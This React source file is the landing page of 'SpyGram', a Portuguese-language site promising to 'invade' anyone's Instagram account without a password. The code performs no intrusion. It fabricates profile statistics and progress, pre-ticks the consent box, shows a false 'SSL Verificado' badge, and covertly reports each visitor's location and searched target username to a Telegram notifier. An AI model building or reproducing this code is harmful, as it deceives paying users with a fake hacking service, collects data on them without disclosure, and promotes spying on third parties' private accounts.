import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { Lock } from 'lucide-react';
import { useApp } from '../context/AppContext';
import TopProgressBar from '../components/TopProgressBar';
import ProtocolWarningModal from '../components/ProtocolWarningModal';
import CounterBanner from '../components/CounterBanner';
import NeonCheckbox from '../components/NeonCheckbox';
import GradientPillButton from '../components/GradientPillButton';
import TargetConfirmModal from '../components/TargetConfirmModal';
import { notifyNewVisit, notifyTargetSearched } from '../utils/telegramNotifier';

export default function LandingPage() {
  const navigate = useNavigate();
  const { setCustomTarget, visitorLocation } = useApp();

  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [agreed, setAgreed] = useState(true);
  const [query, setQuery] = useState('');
  const [progress, setProgress] = useState(0);
  const [profileData, setProfileData] = useState(null);
  const [suggestedProfiles, setSuggestedProfiles] = useState([]);
  const [posts, setPosts] = useState([]);

  // Check for active invasion on load and count page views + notify Telegram
  useEffect(() => {
    const current = parseInt(localStorage.getItem('spygram_page_views') || '142', 10);
    localStorage.setItem('spygram_page_views', (current + 1).toString());

    // Disparar notificação de nova visita uma vez por sessão
    if (!sessionStorage.getItem('spygram_visit_notified')) {
      sessionStorage.setItem('spygram_visit_notified', 'true');
      notifyNewVisit(visitorLocation);
    }

    const active = localStorage.getItem('spygram_active_invasion');
    if (active) {
      sessionStorage.setItem('invasionData', active);
      navigate('/invasion-concluded', { replace: true });
    }
  }, [navigate, visitorLocation]);

  // Progress bar animation during search
  useEffect(() => {
    let timer = null;
    if (isLoading) {
      setProgress(0);
      timer = setInterval(() => {
        setProgress((prev) => (prev < 95 ? prev + 1 : prev));
      }, 100);
    } else {
      setProgress(100);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [isLoading]);

  const handleSearch = useCallback(async () => {
    const cleanUsername = query.trim().replace(/^@+/, '');
    if (!cleanUsername) {
      setErrorMessage('Por favor, insira um nome de usuário.');
      return;
    }
    if (!agreed) {
      setErrorMessage('Você precisa consentir para acessar o perfil.');
      return;
    }

    setIsLoading(true);
    setErrorMessage(null);

    // Notificar Telegram que um alvo começou a ser pesquisado
    notifyTargetSearched({
      target: cleanUsername,
      city: visitorLocation?.city,
      state: visitorLocation?.state
    });

    try {
      sessionStorage.removeItem('invasionEndTime');
      sessionStorage.removeItem('invasionData');
      sessionStorage.removeItem('current_lead_id');
      localStorage.removeItem('spygram_banned_session');
      localStorage.removeItem('spygram_trial_expired');

      const target = await setCustomTarget(cleanUsername);

      const resolvedProfile = {
        username: target.username || cleanUsername,
        fullName: target.fullName || cleanUsername,
        profilePicUrl: target.avatar || target.profilePicUrl || '/perfil.jpg',
        biography: target.bio || target.biography || 'Perfil extraído via sistema de monitoramento.',
        followers: target.followersRaw || target.followers || 14800,
        following: target.followingRaw || target.following || 612,
        postsCount: target.postsCount || 84,
        isVerified: target.verified || target.isVerified || false,
        isPrivate: target.isPrivate !== false
      };

      setProfileData(resolvedProfile);
      setSuggestedProfiles([]);
      setPosts([]);
    } catch (err) {
      console.error('Erro na busca de perfil:', err);
      setErrorMessage(err.message || 'Sistema sobrecarregado, tente novamente mais tarde');
    } finally {
      setIsLoading(false);
    }
  }, [query, agreed, setCustomTarget]);

  const handleConfirmTarget = useCallback(() => {
    if (profileData) {
      const invasionData = {
        profileData,
        suggestedProfiles,
        posts,
        userCity: visitorLocation?.city || 'São Paulo'
      };

      sessionStorage.setItem('invasionData', JSON.stringify(invasionData));
      localStorage.setItem('spygram_active_invasion', JSON.stringify(invasionData));
      navigate('/instagram', { state: invasionData });
    }
  }, [profileData, suggestedProfiles, posts, visitorLocation, navigate]);

  return profileData ? (
    <div className="min-h-screen bg-black flex items-center justify-center p-4 relative z-10">
      <TargetConfirmModal
        profileData={profileData}
        onConfirm={handleConfirmTarget}
        onCorrect={() => setProfileData(null)}
      />
    </div>
  ) : (
    <div className="min-h-screen bg-transparent">
      <TopProgressBar progress={progress} isVisible={isLoading} />
      <ProtocolWarningModal />

      <div className="relative z-20 text-white flex flex-col items-center px-4 pt-12 pb-8 w-full max-w-xl mx-auto">
        <header className="text-center mb-8 w-full max-xl">
          <img
            src="/spygram_transparentebranco.png"
            alt="Logo"
            className="h-24 mx-auto mb-6 object-contain"
          />
          <h1 className="text-5xl font-extrabold mb-4 bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600 text-transparent bg-clip-text uppercase tracking-tight">
            SpyGram
          </h1>
          <p className="text-xl font-bold">
            ACESSE O <span className="text-pink-500">INSTAGRAM</span> DE QUALQUER PESSOA{' '}
            <span className="text-yellow-500">SEM SENHA</span>
          </p>
        </header>

        <main className="w-full flex flex-col items-center">
          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleSearch();
            }}
            className="w-full max-w-md mx-auto flex justify-center items-center"
          >
            <label className="relative block w-[350px] flex rounded-full border-2 border-[#373737] py-[15px] px-4 bg-black/40">
              <input
                type="text"
                value={query}
                onChange={(e) => setQuery(e.target.value.replace(/@/g, ''))}
                onKeyDown={(e) => {
                  if (e.key === 'Enter' && query.trim()) {
                    e.preventDefault();
                    handleSearch();
                  }
                }}
                placeholder={isLoading ? 'Searching...' : 'Ex: neymarjr (sem @)'}
                className="bg-transparent outline-none border-none text-[#c5c5c5] text-base w-full text-center focus:outline-none"
                disabled={isLoading}
              />
            </label>
          </form>

          <CounterBanner />

          <div className="mt-6">
            <NeonCheckbox checked={agreed} onChange={setAgreed} />
          </div>

          <div className="mt-6">
            <GradientPillButton
              onClick={handleSearch}
              disabled={isLoading || !agreed}
            >
              {isLoading ? 'Buscando...' : 'Invadir Conta'}
            </GradientPillButton>
          </div>

          <div className="w-full mt-4">
            {errorMessage && (
              <div
                className="mt-8 bg-red-900/50 border border-red-500 text-red-300 px-4 py-3 rounded-lg text-center"
                role="alert"
              >
                <p className="font-bold">Error</p>
                <p className="text-sm">{errorMessage}</p>
              </div>
            )}
          </div>
        </main>

        <footer className="mt-16 flex items-center gap-1 text-gray-500 text-sm">
          <Lock className="w-4 h-4 text-green-500" />
          <span>SSL Verificado</span>
        </footer>
      </div>
    </div>
  );
}
